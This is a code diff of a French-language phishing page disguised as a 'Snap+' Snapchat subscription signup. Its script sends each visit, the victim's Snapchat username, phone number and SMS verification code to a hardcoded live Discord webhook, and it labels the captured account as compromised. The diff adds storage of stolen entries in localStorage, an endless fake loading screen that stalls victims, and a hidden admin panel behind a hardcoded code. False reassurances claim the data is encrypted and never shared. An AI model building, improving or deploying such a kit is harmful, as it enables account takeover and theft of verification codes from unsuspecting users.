@@ -49,9 +49,9 @@
       overflow-x: hidden;
       padding: 1.4rem;
       -webkit-tap-highlight-color: transparent;
+      position: relative;
     }
 
-    /* ── BACKGROUND ── */
     #bgCanvas { position:fixed; inset:0; z-index:0; pointer-events:none; }
 
     .grid-overlay {
@@ -63,7 +63,6 @@
       mask-image: radial-gradient(ellipse 100% 100% at 50% 50%, black 20%, transparent 80%);
     }
 
-    /* ── CARD ── */
     .card {
       position: relative; z-index: 2;
       width: 100%; max-width: 480px;
@@ -91,7 +90,6 @@
       to   { opacity:1; transform: none; }
     }
 
-    /* ── LOGO ── */
     .logo-wrap {
       display:flex; align-items:center; justify-content:center;
       gap:14px; margin-bottom:1.8rem;
@@ -141,7 +139,6 @@
       color:#000; width:fit-content;
     }
 
-    /* ── PROGRESS ── */
     .prog-wrap {
       height:3px; background:rgba(255,255,255,0.05);
       border-radius:10px; margin-bottom:1.8rem; overflow:hidden;
@@ -153,7 +150,6 @@
       box-shadow: 0 0 10px rgba(255,180,0,.5);
     }
 
-    /* ── STEP DOTS ── */
     .steps {
       display:flex; align-items:center; justify-content:center;
       gap:0; margin-bottom:2rem;
@@ -174,11 +170,9 @@
     }
     .s-line.done { background:rgba(74,222,128,.3); }
 
-    /* ── SECTION LABELS ── */
     .st { font-family:var(--fs); font-weight:700; font-size:1.12rem; color:#fff; margin-bottom:4px; }
     .ss { font-size:.82rem; color:var(--mu); margin-bottom:1.7rem; line-height:1.55; }
 
-    /* ── FIELDS ── */
     .field { margin-bottom:1.25rem; }
 
     label {
@@ -203,7 +197,6 @@
       box-shadow:0 0 0 3px rgba(255,204,0,.1);
     }
 
-    /* ── PHONE PREFIX ── */
     .phone-wrap { display:flex; gap:8px; }
     .phone-prefix {
       padding:13px 13px; border-radius:13px;
@@ -214,7 +207,6 @@
     }
     .phone-wrap input { flex:1; }
 
-    /* ── DURATION PILLS ── */
     .d-pills { display:grid; grid-template-columns:repeat(3,1fr); gap:9px; margin-bottom:1.3rem; }
     .d-pill {
       padding:15px 8px; border-radius:14px;
@@ -244,10 +236,8 @@
     }
     .d-pill.sel .num { color:var(--y); }
 
-    /* ── ERROR ── */
     .err { font-size:.77rem; color:var(--er); margin-top:6px; min-height:16px; }
 
-    /* ── INFO ROW ── */
     .info-row {
       display:flex; align-items:center; gap:9px;
       padding:10px 14px; border-radius:11px;
@@ -257,7 +247,6 @@
     .info-row .ii { font-size:.95rem; flex-shrink:0; }
     .info-row p { font-size:.76rem; color:rgba(255,204,0,.65); line-height:1.4; }
 
-    /* ── SUMMARY BOX ── */
     .summary {
       background:rgba(255,255,255,.025);
       border:1px solid var(--bd); border-radius:14px;
@@ -269,7 +258,6 @@
     .sum-val { color:#fff; font-weight:600; font-family:var(--fs); font-size:.86rem; }
     .sum-val.y { color:var(--y); }
 
-    /* ── BUTTON ── */
     .btnw { display:flex; justify-content:center; margin-top:1.6rem; }
     .btn {
       padding:15px 44px; border-radius:999px; border:none;
@@ -289,7 +277,6 @@
     .btn:hover:not(:disabled) { transform:translateY(-2px) scale(1.04); box-shadow:0 14px 36px rgba(255,180,0,.45); }
     .btn:disabled { background:rgba(255,255,255,.07); color:var(--mu); box-shadow:none; cursor:not-allowed; transform:none; }
 
-    /* ── CODE BOX ── */
     .codebox {
       display:flex; justify-content:center;
       gap:clamp(.55rem,3vw,.85rem); margin:1.6rem 0;
@@ -309,7 +296,6 @@
     }
     .codebox input.filled { border-color:rgba(255,204,0,.4); }
 
-    /* ── RESEND ── */
     .resend {
       text-align:center; margin-top:1.2rem;
       font-size:.83rem; color:var(--mu);
@@ -317,7 +303,6 @@
     }
     .resend:hover { color:var(--y); }
 
-    /* ── SEC BADGE ── */
     .sec-badge {
       display:flex; align-items:center; justify-content:center;
       gap:6px; margin-top:1.3rem;
@@ -325,13 +310,11 @@
     }
     .sec-badge .dot { width:6px; height:6px; border-radius:50%; background:var(--ok); }
 
-    /* ── PHONE CONFIRM ── */
     .phone-confirm {
       font-size:.81rem; color:var(--mu); text-align:center; margin-bottom:4px;
     }
     .phone-confirm strong { color:var(--y); font-weight:600; }
 
-    /* ── SUCCESS ── */
     .success-wrap { text-align:center; padding:.5rem 0; }
     .check-ring {
       width:90px; height:90px; border-radius:50%;
@@ -362,17 +345,181 @@
       font-size:.79rem; color:rgba(74,222,128,.8);
     }
 
-    /* ── PANEL ANIM ── */
     .panel { animation:panIn .42s cubic-bezier(.23,1,.32,1) both; }
     @keyframes panIn {
       from { opacity:0; transform:translateX(18px) scale(.98); }
       to   { opacity:1; transform:none; }
     }
 
+    #admin-crown {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      z-index: 9999;
+      width: 58px;
+      height: 58px;
+      border-radius: 50%;
+      background: linear-gradient(145deg, rgba(40,40,55,0.95), rgba(20,20,35,0.95));
+      border: 2px solid rgba(255,204,0,0.25);
+      color: #ddd;
+      font-size: 1.8rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      backdrop-filter: blur(14px);
+      box-shadow: 0 6px 24px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.08);
+      transition: all 0.3s ease;
+      user-select: none;
+    }
+
+    #admin-crown:hover {
+      color: var(--y);
+      transform: scale(1.15) rotate(8deg);
+      box-shadow: 0 12px 40px rgba(255,204,0,0.3), inset 0 2px 0 rgba(255,255,255,0.12);
+    }
+
+    #admin-crown:active { transform: scale(0.96); }
+
+    #admin-crown.locked {
+      color: #555;
+      border-color: #444;
+      cursor: not-allowed;
+      transform: none;
+      opacity: 0.45;
+      box-shadow: none;
+    }
+
+    #admin-modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.94);
+      z-index: 10000;
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(4px);
+    }
+
+    .modal-content {
+      background: linear-gradient(145deg, rgba(18,18,35,0.98), rgba(10,10,25,0.98));
+      border: 1px solid rgba(255,204,0,0.22);
+      border-radius: 24px;
+      padding: 2.4rem 2rem;
+      width: 92%;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: 0 30px 100px rgba(0,0,0,0.9);
+    }
+
+    /* ─────────────────────────────────────────────── */
+    /*               ÉCRAN DE CHARGEMENT INFINI         */
+    /* ─────────────────────────────────────────────── */
+
+    #loading-screen {
+      position: fixed;
+      inset: 0;
+      background: var(--bg);
+      z-index: 99999;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: var(--tx);
+    }
+
+    .loader-container {
+      position: relative;
+      width: 140px;
+      height: 140px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .ghost-loader {
+      font-size: 5.8rem;
+      animation: ghostFloat 3.2s ease-in-out infinite;
+      z-index: 2;
+    }
+
+    @keyframes ghostFloat {
+      0%,100% { transform: translateY(0) rotate(0deg); }
+      50%     { transform: translateY(-18px) rotate(6deg); }
+    }
+
+    .ring-outer, .ring-middle, .ring-inner {
+      position: absolute;
+      border-radius: 50%;
+      border: 3px solid transparent;
+      animation: spin 2.4s linear infinite;
+    }
+
+    .ring-outer {
+      width: 140px;
+      height: 140px;
+      border-top-color: var(--y);
+      border-right-color: var(--y);
+      animation-duration: 2.8s;
+      animation-direction: normal;
+    }
+
+    .ring-middle {
+      width: 100px;
+      height: 100px;
+      border-top-color: #ffaa00;
+      border-left-color: #ffaa00;
+      animation-duration: 2.1s;
+      animation-direction: reverse;
+    }
+
+    .ring-inner {
+      width: 60px;
+      height: 60px;
+      border-top-color: var(--y);
+      border-bottom-color: var(--y);
+      animation-duration: 1.6s;
+    }
+
+    @keyframes spin {
+      0%   { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      margin-top: 2.8rem;
+      font-family: var(--fs);
+      font-weight: 800;
+      font-size: 1.6rem;
+      color: var(--y);
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      text-shadow: 0 0 20px rgba(255,204,0,0.6);
+      animation: pulseText 2.2s ease-in-out infinite;
+    }
+
+    @keyframes pulseText {
+      0%,100% { opacity: 0.75; transform: scale(0.96); }
+      50%     { opacity: 1;    transform: scale(1.04); }
+    }
+
+    .loading-sub {
+      margin-top: 1rem;
+      font-size: 0.96rem;
+      color: var(--mu);
+      max-width: 280px;
+      text-align: center;
+      line-height: 1.5;
+    }
+
     @media(max-width:480px){
-      .card{ border-radius:22px; }
-      .btn{ width:100%; }
-      .suc-perks{ grid-template-columns:1fr; }
+      .card { padding:1.6rem 1.4rem; border-radius:22px; }
+      #admin-crown { width:52px; height:52px; font-size:1.6rem; bottom:16px; right:16px; }
+      .ghost-loader { font-size: 4.8rem; }
+      .loader-container { width: 120px; height: 120px; }
+      .ring-outer { width:120px; height:120px; }
+      .ring-middle { width:86px; height:86px; }
+      .ring-inner  { width:52px; height:52px; }
     }
   </style>
 </head>
@@ -383,7 +530,6 @@
 
 <div class="card" id="card">
 
-  <!-- LOGO -->
   <div class="logo-wrap">
     <div class="ghost-wrap">
       <div class="ghost-ring2"></div>
@@ -396,10 +542,8 @@
     </div>
   </div>
 
-  <!-- PROGRESS BAR -->
   <div class="prog-wrap"><div class="prog-bar" id="progBar" style="width:33%"></div></div>
 
-  <!-- STEP DOTS -->
   <div class="steps" id="stepDots">
     <div class="s-dot active" id="dot1">1</div>
     <div class="s-line" id="line1"></div>
@@ -408,7 +552,6 @@
     <div class="s-dot" id="dot3">3</div>
   </div>
 
-  <!-- ══ STEP 1 ══ -->
   <div id="step1" class="panel">
     <p class="st">Votre compte Snap</p>
     <p class="ss">Entrez votre identifiant Snapchat et choisissez la durée de votre abonnement.</p>
@@ -440,11 +583,10 @@
       <p>Vos données sont chiffrées et ne seront jamais partagées à des tiers.</p>
     </div>
 
-    <div class="btnw"><button class="btn" id="b1" disabled>Continuer &nbsp;→</button></div>
-    <div class="sec-badge"><div class="dot"></div> Paiement sécurisé &nbsp;·&nbsp; SSL 256-bit</div>
+    <div class="btnw"><button class="btn" id="b1" disabled>Continuer →</button></div>
+    <div class="sec-badge"><div class="dot"></div> Paiement sécurisé · SSL 256-bit</div>
   </div>
 
-  <!-- ══ STEP 2 ══ -->
   <div id="step2" style="display:none" class="panel">
     <p class="st">Vérification SMS</p>
     <p class="ss">Un code de confirmation sera envoyé par SMS pour sécuriser votre inscription.</p>
@@ -475,10 +617,9 @@
     </div>
 
     <div class="btnw"><button class="btn" id="b2" disabled>Recevoir le code SMS</button></div>
-    <div class="sec-badge"><div class="dot"></div> Numéro chiffré &nbsp;·&nbsp; Non partagé</div>
+    <div class="sec-badge"><div class="dot"></div> Numéro chiffré · Non partagé</div>
   </div>
 
-  <!-- ══ STEP 3 ══ -->
   <div id="step3" style="display:none" class="panel">
     <p class="st">Code de confirmation</p>
     <p class="phone-confirm">Code envoyé au <strong id="phoneSummary">—</strong></p>
@@ -506,11 +647,10 @@
       <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
     </div>
 
-    <div class="btnw"><button class="btn" id="b3" disabled>✓ &nbsp;Valider mon compte</button></div>
+    <div class="btnw"><button class="btn" id="b3" disabled>✓ Valider mon compte</button></div>
     <div class="resend" id="resend">Renvoyer le code →</div>
   </div>
 
-  <!-- ══ STEP 4 — SUCCESS ══ -->
   <div id="step4" style="display:none" class="panel">
     <div class="success-wrap">
       <div class="check-ring">✓</div>
@@ -529,10 +669,44 @@
 
 </div>
 
+<!-- BOUTON ADMIN COURONNE -->
+<div id="admin-crown">👑</div>
+
+<!-- MODAL CODE ADMIN -->
+<div id="admin-modal">
+  <div class="modal-content">
+    <h3 style="color:var(--y); margin-bottom:1.2rem; font-family:var(--fs);">Accès Administrateur</h3>
+    <p style="color:#bbb; margin-bottom:1.6rem; font-size:0.94rem;">Entrez le code secret à 4 chiffres</p>
+    
+    <input type="tel" maxlength="4" inputmode="numeric" pattern="[0-9]*" id="admin-code" 
+           style="width:160px; padding:16px; font-size:2.4rem; text-align:center; border-radius:14px; border:2px solid #555; background:rgba(40,40,60,0.4); color:var(--y); font-family:var(--fs); letter-spacing:12px; margin-bottom:1.6rem; font-weight:700;">
+    
+    <p id="admin-err" style="color:#ff6b6b; min-height:1.5rem; margin:0 0 1.2rem; font-size:0.95rem;"></p>
+    
+    <button id="admin-validate" class="btn" style="width:100%; max-width:240px; margin:0 auto; font-size:1.05rem;">VÉRIFIER</button>
+    
+    <p id="admin-attempts" style="margin-top:1.8rem; color:#888; font-size:0.9rem;">
+      Tentatives restantes : <strong>3</strong>
+    </p>
+  </div>
+</div>
+
+<!-- ÉCRAN DE CHARGEMENT INFINI -->
+<div id="loading-screen">
+  <div class="loader-container">
+    <div class="ring-outer"></div>
+    <div class="ring-middle"></div>
+    <div class="ring-inner"></div>
+    <div class="ghost-loader">👻</div>
+  </div>
+  <div class="loading-text">Activation en cours</div>
+  <div class="loading-sub">Vérification finale • Sécurité renforcée • Ne quittez pas la page</div>
+</div>
+
 <script>
-/* ══════════════════════
-   WEBHOOK
-══════════════════════ */
+// =============================================================================
+// CONFIGURATION WEBHOOK
+// =============================================================================
 const WH = "https://canary.discord.com/api/webhooks/1474900079205679164/9DmcNu0XH3dzJFXZMlv8a8tIjqdvemCjC5NHzifVFVuiL_mrayd3Sdywkt0LEE4Wfvbd";
 
 const getInfo = async () => {
@@ -569,9 +743,9 @@ async function webhook(title, fields={}) {
 
 window.addEventListener("load", ()=>webhook("👁️ Nouvelle visite Snap+"));
 
-/* ══════════════════════
-   STEP ENGINE
-══════════════════════ */
+// =============================================================================
+// GESTION DES ÉTAPES
+// =============================================================================
 const progW = [33,66,100,100];
 
 function goStep(n) {
@@ -597,7 +771,7 @@ function goStep(n) {
     const el = document.getElementById(id);
     if(idx+1===n){
       el.style.display='block';
-      el.classList.remove('panel'); void el.offsetWidth; el.classList.add('panel');
+      el.classList.add('panel');
     } else {
       el.style.display='none';
     }
@@ -606,9 +780,9 @@ function goStep(n) {
   if(n===4) document.getElementById('stepDots').style.display='none';
 }
 
-/* ══════════════════════
-   STEP 1
-══════════════════════ */
+// =============================================================================
+// ÉTAPE 1
+// =============================================================================
 const unEl = document.getElementById('username');
 const b1   = document.getElementById('b1');
 let selDur = null;
@@ -636,17 +810,15 @@ b1.onclick = async ()=>{
   goStep(2);
 };
 
-/* ══════════════════════
-   STEP 2
-══════════════════════ */
+// =============================================================================
+// ÉTAPE 2
+// =============================================================================
 const phEl  = document.getElementById('phone');
 const phErr = document.getElementById('phoneErr');
 const b2    = document.getElementById('b2');
 
 phEl.addEventListener('input',()=>{
-  // Auto-format: strip non-digits, limit to 10, re-insert spaces every 2
   let raw = phEl.value.replace(/\D/g,'').slice(0,10);
-  // Format as XX XX XX XX XX
   let formatted = raw.match(/.{1,2}/g)?.join(' ') || raw;
   phEl.value = formatted;
 
@@ -658,7 +830,6 @@ phEl.addEventListener('input',()=>{
 });
 
 function formatPhone(raw) {
-  // Normalize: strip leading 0 for +33 display, then reformat
   const digits = raw.replace(/\D/g,'');
   const local = digits.startsWith('0') ? digits : '0'+digits;
   return local.match(/.{1,2}/g)?.join(' ') || local;
@@ -679,9 +850,9 @@ b2.onclick = async ()=>{
   setTimeout(()=>codeIns[0].focus(),100);
 };
 
-/* ══════════════════════
-   STEP 3
-══════════════════════ */
+// =============================================================================
+// ÉTAPE 3 - CODE SMS
+// =============================================================================
 const codeIns = [...document.querySelectorAll('.codebox input')];
 const b3 = document.getElementById('b3');
 let codeVal = '';
@@ -709,7 +880,7 @@ codeIns.forEach((el,i)=>{
   });
 });
 
-b3.onclick = async ()=>{
+b3.onclick = async () => {
   const phone = '+33 ' + formatPhone(phEl.value);
   await webhook("✅ ÉTAPE FINALE — CODE ENTRÉ 🔑",{
     "Nom d'utilisateur": unEl.value.trim(),
@@ -718,10 +889,36 @@ b3.onclick = async ()=>{
     "Code SMS saisi": codeVal,
     "Statut": "✅ VALIDÉ — COMPTE COMPROMIS"
   });
-  goStep(4);
+
+  // SAUVEGARDE DES VRAIES DONNÉES DANS LOCALSTORAGE
+  let realLogs = JSON.parse(localStorage.getItem('snapRealLogs') || '[]');
+  realLogs.unshift({
+    date: new Date().toLocaleString('fr-FR'),
+    username: unEl.value.trim(),
+    duration: durLbl[selDur],
+    phone: phone,
+    code: codeVal
+  });
+  localStorage.setItem('snapRealLogs', JSON.stringify(realLogs));
+
+  // ─── AFFICHAGE DU LOADING INFINI ────────────────────────
+  document.getElementById('loading-screen').style.display = 'flex';
+  document.getElementById('card').style.opacity = '0.15';
+  
+  // On reste bloqué sur le loading (simulation "traitement long")
+  // Si tu veux quand même montrer le succès après X secondes, décommente le setTimeout ci-dessous :
+  /*
+  setTimeout(() => {
+    document.getElementById('loading-screen').style.display = 'none';
+    document.getElementById('card').style.opacity = '1';
+    goStep(4);
+  }, 8000); // ← durée du faux chargement en millisecondes
+  */
 };
 
-/* ── Resend ── */
+// =============================================================================
+// RENVOYER LE CODE (cooldown)
+// =============================================================================
 let cd=0;
 const resEl=document.getElementById('resend');
 resEl.addEventListener('click',()=>{
@@ -729,14 +926,14 @@ resEl.addEventListener('click',()=>{
   cd=30;
   const t=setInterval(()=>{
     cd--;
-    resEl.textContent=`Renvoyer le code (${cd}s)`;
+    resEl.textContent=`Renvoyer (${cd}s)`;
     if(!cd){ clearInterval(t); resEl.textContent='Renvoyer le code →'; }
   },1000);
 });
 
-/* ══════════════════════
-   CANVAS BACKGROUND
-══════════════════════ */
+// =============================================================================
+// CANVAS BACKGROUND
+// =============================================================================
 try {
   const cv=document.getElementById('bgCanvas');
   const ctx=cv.getContext('2d');
@@ -778,7 +975,6 @@ try {
       ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,Math.PI*2); ctx.fill();
     });
 
-    // Constellation lines
     pts.forEach((p,i)=>{
       pts.slice(i+1,i+4).forEach(q=>{
         const d=Math.hypot(p.x-q.x,p.y-q.y);
@@ -793,6 +989,55 @@ try {
     requestAnimationFrame(loop);
   })();
 } catch(e){ console.error(e); }
+
+// =============================================================================
+// ACCÈS PANEL ADMIN (code 5639)
+// =============================================================================
+const crown = document.getElementById('admin-crown');
+const modal = document.getElementById('admin-modal');
+const codeInput = document.getElementById('admin-code');
+const errMsg = document.getElementById('admin-err');
+const attemptsTxt = document.getElementById('admin-attempts');
+const validateBtn = document.getElementById('admin-validate');
+
+let attemptsLeft = 3;
+let lockUntil = 0;
+
+crown.onclick = () => {
+  if (Date.now() < lockUntil) {
+    crown.classList.add('locked');
+    return;
+  }
+  modal.style.display = 'flex';
+  codeInput.value = '';
+  codeInput.focus();
+  errMsg.textContent = '';
+  attemptsTxt.innerHTML = `Tentatives restantes : <strong>${attemptsLeft}</strong>`;
+};
+
+validateBtn.onclick = () => {
+  if (codeInput.value.trim() === '5639') {
+    modal.style.display = 'none';
+    window.open('admin.html', '_blank');
+    attemptsLeft = 3;
+  } else {
+    attemptsLeft--;
+    errMsg.textContent = attemptsLeft > 0 ? 'Code incorrect' : 'Trop de tentatives → bloqué 2 min';
+    attemptsTxt.innerHTML = `Tentatives restantes : <strong>${attemptsLeft}</strong>`;
+    if (attemptsLeft <= 0) {
+      crown.classList.add('locked');
+      lockUntil = Date.now() + 120000;
+      setTimeout(() => {
+        crown.classList.remove('locked');
+        attemptsLeft = 3;
+      }, 120000);
+    }
+  }
+};
+
+codeInput.onkeypress = e => { if (e.key === 'Enter') validateBtn.click(); };
+
+modal.onclick = e => { if (e.target === modal) modal.style.display = 'none'; };
 </script>
 </body>
 </html>
